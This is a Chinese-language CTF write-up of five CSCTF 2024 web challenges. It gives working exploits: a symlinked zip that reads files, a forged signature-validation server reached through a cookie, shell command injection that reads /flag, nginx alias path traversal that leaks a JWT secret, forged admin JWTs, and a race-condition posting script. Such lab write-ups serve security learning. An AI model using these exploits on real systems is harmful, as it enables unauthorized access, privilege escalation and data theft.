---
title: "CSCTF 2024 EICS1 web 部分 wp"
date: 2024-09-04 13:46
updated: 2024-09-04 13:46
categories: "CTF"
tags:
  - "CTF"
  - "Web Security"
  - "Writeup"
  - "Python"
  - "Crypto"
description: "开始打这种难度高的CTF了，这辈子有了 Web ZipZone Feature Unlocked Trendz Trendzzz Trendzz Web ZipZone 下载附件开工 app.py import logging import os import subprocess import u"
original_url: "https://www.cnblogs.com/LAMENTXU/articles/18396244"
---
![](/images/migrated/18396244/01.png)

开始打这种难度高的CTF了，这辈子有了

**[Web](https://www.cnblogs.com/LAMENTXU#1)**

-   [ZipZone](https://www.cnblogs.com/LAMENTXU#1.1)
-   [Feature Unlocked](https://www.cnblogs.com/LAMENTXU#1.2)
-   [Trendz](https://www.cnblogs.com/LAMENTXU#1.3)
-   [Trendzzz](https://www.cnblogs.com/LAMENTXU#1.4)
-   [Trendzz](https://www.cnblogs.com/LAMENTXU#1.5)

# Web

## ZipZone

下载附件开工

app.py

```
import logging
import os
import subprocess
import uuid

from flask import (
    Flask,
    abort,
    flash,
    redirect,
    render_template,
    request,
    send_from_directory,
)

app = Flask(__name__)
upload_dir = "/tmp/"

app.config["MAX_CONTENT_LENGTH"] = 1 * 10**6  # 1 MB
app.config["SECRET_KEY"] = os.urandom(32)

@app.route("/", methods=["GET", "POST"])
def upload():
    if request.method == "GET":
        return render_template("index.html")

    if "file" not in request.files:
        flash("No file part!", "danger")
        return render_template("index.html")

    file = request.files["file"]
    if file.filename.split(".")[-1].lower() != "zip":
        flash("Only zip files allowed are allowed!", "danger")
        return render_template("index.html")

    upload_uuid = str(uuid.uuid4())
    filename = f"{upload_dir}raw/{upload_uuid}.zip"
    file.save(filename)
    subprocess.call(["unzip", filename, "-d", f"{upload_dir}files/{upload_uuid}"])
    flash(
        f'Your file is at <a href="/files/{upload_uuid}">{upload_uuid}</a>!', "success"
    )
    logging.info(f"User uploaded file {upload_uuid}.")
    return redirect("/")

@app.route("/files/<path:path>")
def files(path):
    try:
        return send_from_directory(upload_dir + "files", path)
    except PermissionError:
        abort(404)

@app.errorhandler(404)
def page_not_found(error):
    return render_template("404.html")

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
```

一个zip上传功能，没几行代码看就完了

观察到/files直接用send\_from\_dictionary方法发送文件，没有对文件路径进行检查

看到这里条件反射想到路径穿越。于是寻找sink点

sink：  
![](/images/migrated/18396244/02.png)

注意到，服务器在解压zip时并没有对内容进行检查。

一眼丁真：软连接攻击

但是flag在根目录下没权限，卡这了。后来我队友告诉我在entrypoint.sh里有这样一行代码

```
cp /home/user/flag.txt /tmp/flag.txt
```

我：？？？？？？？？？？？？？？

这下有权限了。

linux的软连接类似于windows里的快捷方式。我们新建一个文件并添加软连接读取../../../../../../tmp/flag.txt

```
ln -s ../../../../../../tmp/flag.txt evil.txt

zip -symlinks evil.txt evil.zip
```

提交，访问得flag

**CSCTF{5yml1nk5\_4r3\_w31rd}**

## Feature Unlocked

下载附件

main.py

```
import subprocess
import base64
import json
import time
import requests
import os
from flask import Flask, request, render_template, make_response, redirect, url_for
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS
from itsdangerous import URLSafeTimedSerializer

app = Flask(__name__)
app.secret_key = os.urandom(16)
serializer = URLSafeTimedSerializer(app.secret_key)

DEFAULT_VALIDATION_SERVER = 'http://127.0.0.1:1338'
NEW_FEATURE_RELEASE = int(time.time()) + 7 * 24 * 60 * 60
DEFAULT_PREFERENCES = base64.b64encode(json.dumps({
    'theme': 'light',
    'language': 'en'
}).encode()).decode()

def get_preferences():
    preferences = request.cookies.get('preferences')
    if not preferences:
        response = make_response(render_template(
            'index.html', new_feature=False))
        response.set_cookie('preferences', DEFAULT_PREFERENCES)
        return json.loads(base64.b64decode(DEFAULT_PREFERENCES)), response
    return json.loads(base64.b64decode(preferences)), None

@app.route('/')
def index():
    _, response = get_preferences()
    return response if response else render_template('index.html', new_feature=False)

@app.route('/release')
def release():
    token = request.cookies.get('access_token')
    if token:
        try:
            data = serializer.loads(token)
            if data == 'access_granted':
                return redirect(url_for('feature'))
        except Exception as e:
            print(f"Token validation error: {e}")

    validation_server = DEFAULT_VALIDATION_SERVER
    if request.args.get('debug') == 'true':
        preferences, _ = get_preferences()
        validation_server = preferences.get(
            'validation_server', DEFAULT_VALIDATION_SERVER)

    if validate_server(validation_server):
        response = make_response(render_template(
            'release.html', feature_unlocked=True))
        token = serializer.dumps('access_granted')
        response.set_cookie('access_token', token, httponly=True, secure=True)
        return response

    return render_template('release.html', feature_unlocked=False, release_timestamp=NEW_FEATURE_RELEASE)

@app.route('/feature', methods=['GET', 'POST'])
def feature():
    token = request.cookies.get('access_token')
    if not token:
        return redirect(url_for('index'))

    try:
        data = serializer.loads(token)
        if data != 'access_granted':
            return redirect(url_for('index'))

        if request.method == 'POST':
            to_process = request.form.get('text')
            try:
                word_count = f"echo {to_process} | wc -w"
                output = subprocess.check_output(
                    word_count, shell=True, text=True)
            except subprocess.CalledProcessError as e:
                output = f"Error: {e}"
            return render_template('feature.html', output=output)

        return render_template('feature.html')
    except Exception as e:
        print(f"Error: {e}")
        return redirect(url_for('index'))

def get_pubkey(validation_server):
    try:
        response = requests.get(f"{validation_server}/pubkey")
        response.raise_for_status()
        return ECC.import_key(response.text)
    except requests.RequestException as e:
        raise Exception(
            f"Error connecting to validation server for public key: {e}")

def validate_access(validation_server):
    pubkey = get_pubkey(validation_server)
    try:
        response = requests.get(validation_server)
        response.raise_for_status()
        data = response.json()
        date = data['date'].encode('utf-8')
        signature = bytes.fromhex(data['signature'])
        verifier = DSS.new(pubkey, 'fips-186-3')
        verifier.verify(SHA256.new(date), signature)
        return int(date)
    except requests.RequestException as e:
        raise Exception(f"Error validating access: {e}")

def validate_server(validation_server):
    try:
        date = validate_access(validation_server)
        return date >= NEW_FEATURE_RELEASE
    except Exception as e:
        print(f"Error: {e}")
    return False

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)
```

validation\_server.py

```
from flask import Flask, jsonify
import time
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS

app = Flask(__name__)

key = ECC.generate(curve='p256')
pubkey = key.public_key().export_key(format='PEM')

@app.route('/pubkey', methods=['GET'])
def get_pubkey():
    return pubkey, 200, {'Content-Type': 'text/plain; charset=utf-8'}

@app.route('/', methods=['GET'])
def index():
    date = str(int(time.time()))
    h = SHA256.new(date.encode('utf-8'))
    signature = DSS.new(key, 'fips-186-3').sign(h)

    return jsonify({
        'date': date,
        'signature': signature.hex()
    })

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=1338)
```

审计完之后大致有个思路了：先绕过签名校验得到访问features的权限，再用features打RCE

套题蒸鹅心

验证权限的地方跟wanictf的one\_day\_one\_letter神似。问题在于wanictf中的挑战可以直接在请求包中伪造验证服务器。顺着这个思路，我们也许也要通过某些方法伪造验证服务器。

sink:  
![](/images/migrated/18396244/03.png)

这两行代码在这里纯纯意义不明（bushi）python里的get在字典中没有参数的时候返回值为默认值，即DEFAULT\_VALIDATION\_SERVER

而cookie中preferences字典里不可能有validation\_server这个参数，也就是说这个参数每一次都是默认值

burp抓包看preference为eyJ0aGVtZSI6ICJsaWdodCIsICJsYW5ndWFnZSI6ICJlbiJ9，base64解码后得到{"theme": "light", "language": "en"}

为了绕过签名校验我们生成对公钥和私钥

```
from Crypto.PublicKey import ECC

key = ECC.generate(curve='P-256')

with open('pubkey', 'w') as f:
    f.write(key.public_key().export_key(format='PEM'))

with open('privkey', 'w') as f:
    f.write(key.export_key(format='PEM'))
```

随后服务器上起个伪造的验证服务，将时间提前10000

```
from flask import Flask, jsonify
import time
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS

app = Flask(__name__)

key = ECC.import_key('''-----BEGIN PRIVATE KEY-----
MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgwwP94eTUCNYIgIye
QfbV7ezstOEOjPo27AsYGZ3EI5+hRANCAATmA8G24jcmc63PgzlImXApG9inScMH
f1Tqq2WLDPEioUiULfcxHzJohj/i5kH0ZTtgViPHufUdsidIqEgnMmvM
-----END PRIVATE KEY-----''') # 复制privkey内容贴进来

pubkey = key.public_key().export_key(format='PEM')

@app.route('/pubkey', methods=['GET'])
def get_pubkey():
    return pubkey, 200, {'Content-Type': 'text/plain; charset=utf-8'}

@app.route('/', methods=['GET'])
def index():
    date = str(int(time.time()) + 7 * 24 * 60 * 60 + 10000)
    h = SHA256.new(date.encode('utf-8'))
    signature = DSS.new(key, 'fips-186-3').sign(h)

    return jsonify({
        'date': date,
        'signature': signature.hex()
    })

if __name__ == '__main__':
    app.run(host='YOUR VPS IP', port=3000)
```

修改cookie中preference内容为{"theme": "light", "language": "en", "validation\_server": "YOUR VPS IP:3000"}并且进行base64编码。

带着这个cookie访问https://feature-unlocked-web-challs.csc.tf/release得到访问features权限

接下来就到了中国CTFer最熟悉的linux RCE环节（））（别笑，老外比赛里全是xss一点不会）

![](/images/migrated/18396244/04.png)

甚至有回显，甚至没过滤，他真的我哭死

随便打，想怎么打都行了（%23为#的url编码）

```
GET: ?text=cat /flag %23
```

**CSCTF{d1d\_y0u\_71m3\_7r4v3l\_f0r\_7h15\_fl46?!}**

## Trendz

审计代码，得到题目大致思路为伪造admin的jwt

这题正解是xss（admin有bot但superadmin没有），而trendzzz正解是伪造jwt。喵的不会xss干脆全部伪造jwt做得了

validation.go

```
func ValidateAdmin() gin.HandlerFunc {
	return func(c *gin.Context) {
		const bearerSchema = "Bearer "
		var tokenDetected bool = false
		var tokenString string
		authHeader := c.GetHeader("Authorization")
		if len(authHeader) != 0 {
			tokenDetected = true
			tokenString = authHeader[len(bearerSchema):]
		}
		if !tokenDetected {
			var err error
			tokenString, err = c.Cookie("accesstoken")
			if tokenString == "" || err != nil {
				c.Redirect(302, "/getAccessToken?redirect="+c.Request.URL.Path)
			}
		}
		fmt.Println(tokenString)
		claims := jwt.ExtractClaims(tokenString)
		if claims["role"] == "admin" || claims["role"] == "superadmin" {
			fmt.Println(claims)
		} else {
			fmt.Println("Token is not valid")
			c.AbortWithStatusJSON(403, gin.H{"error": "User Unauthorized"})
			return
		}
	}
}
```

发现要伪造身份为admin或superadmin，对应两个flag（trendz和trendzzz）做法完全一样

但是没有jwt.secret我们什么都干不了，而jwt.secret在与main.go一样的web app根目录下

然后我就红温了，后来队友告诉我忘看配置文件了

config

```
user  nobody;
worker_processes  auto;

events {
    worker_connections  1024;
}

http {
    include       mime.types;
    default_type  application/octet-stream;

    sendfile        on;
    keepalive_timeout  65;

    server {
        listen       80;
        server_name  localhost;
        location / {
            proxy_pass http://localhost:8000;
        }
        location /static {
            alias /app/static/;
        }
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }

    }

}
```

注意到

![](/images/migrated/18396244/05.png)

我：？？？？？？？？？？？？？？？？？？？？？？（怎么这一幕有点似曾相识，好像ZipZone也是没看配置文件导致没做出来）

谁都没有想到sink居然在他喵的配置文件里（）））这里的static有个alias还没有检查路径穿越

直接访问

```
/static../jwt.secret
```

就等同于

```
/app/static/../jwt.secret
```

就等同于

```
/app/jwt.secret
```

得到jwt的密钥之后伪造即可

```
package main

import (
	"fmt"
	"time"

	"github.com/golang-jwt/jwt/v5"
)

func main() {
	// 使用给定的密钥
	secretKey := []byte("7e0e4bba1492788a15328814b328dba359839460\n")

	// 创建JWT，包含admin角色
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{
		"username": "admin",
		"role":     "admin",
		"exp":      time.Now().Add(time.Hour * 24).Unix(), // 设置过期时间为24小时
		"iat":      time.Now().Unix(),
	})

	// 签名令牌
	signedToken, err := token.SignedString(secretKey)
	if err != nil {
		fmt.Println("Error generating token:", err)
		return
	}

	fmt.Println("Generated Admin JWT:", signedToken)
}
```

进入admin的dashboard查看唯一一个post得到flag

```
CSCTF{0a97afb3-64be-4d96-aa52-86a91a2a3c52}
```

## Trendzzz

与trendz中我的做法完全相同，把admin换成superadmin就行

```
package main

import (
	"fmt"
	"time"

	"github.com/golang-jwt/jwt/v5"
)

func main() {
	// 使用给定的密钥
	secretKey := []byte("7e0e4bba1492788a15328814b328dba359839460\n")

	// 创建JWT，包含superadmin角色
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{
		"username": "superadmin",
		"role":     "superadmin",
		"exp":      time.Now().Add(time.Hour * 24).Unix(), // 设置过期时间为24小时
		"iat":      time.Now().Unix(),
	})

	// 签名令牌
	signedToken, err := token.SignedString(secretKey)
	if err != nil {
		fmt.Println("Error generating token:", err)
		return
	}

	fmt.Println("Generated SuperAdmin JWT:", signedToken)
}
```

flag登陆就送

## Trendzz

题目说要发表12个post就有flag，但是你只能发表10个post

像这种题典型的条件竞争，在第十个post发送的时候连续发3个post就行

exp.py

```
import aiohttp
import asyncio

url = 'YOUR URL/user/posts/create'

post_data = {
    "title": "1",
    "data": "1"
}

cookies = {
    "accesstoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjUyNzQxMzksImlhdCI6MTcyNTI3MzUzOSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6ImgifQ.PT9VM2KV4dSlp3uNTfRuwsJ_3hfaPKaLWNbkZiWt0TQ"
}

async def Post(session, semaphore):
    async with semaphore:
        async with session.post(url, json=post_data, cookies=cookies) as response:
            text = await response.text()
            print(f"{text}")

async def main():
    concurrency_limit = 100
    semaphore = asyncio.Semaphore(concurrency_limit)

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=concurrency_limit)) as session:
        tasks = []
        for i in range(50):
          tasks.append(Post(session, semaphore))
        await asyncio.gather(*tasks)

asyncio.run(main())
```

**CSCTF{d2426fb5-a93a-4cf2-b353-eac8e0e9cf94}**
